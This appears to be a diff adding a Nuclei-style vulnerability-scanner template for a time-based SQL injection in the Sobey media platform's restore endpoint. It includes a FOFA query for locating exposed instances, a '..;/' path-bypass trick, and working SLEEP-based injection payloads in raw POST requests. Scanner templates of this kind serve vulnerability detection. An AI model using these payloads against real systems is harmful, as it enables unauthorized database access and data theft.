@@ -1,0 +1,29 @@
+id: sobey-media-restore-sqli
+info:
+  name: "索贝融媒体工作平台 restore 接口 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: icon_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"
+      通过分析索贝产品中的 /sobey-mchEditor/mch/WXArticleInt/restore 接口交互逻辑，发现其存在可被利用的SQL注入缺陷。攻击者可利用该接口的SQL注入漏洞执行恶意构造的SQL语句，从而提取敏感数据或实现对数据库的未授权控制。
+  tags: 索贝融媒体
+http:
+- raw:
+  - |
+    POST /sobey-mchEditor/js/..;/mch/WXArticleInt/restore HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    siteCode=&id=1 AND (SELECT 2804 FROM (SELECT(SLEEP(5)))MDfc)&token=
+  - |
+    POST /sobey-mchEditor/js/..;/mch/WXArticleInt/restore HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    siteCode=&id=1 AND (SELECT 2804 FROM (SELECT(SLEEP(8)))MDfc)&token=
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
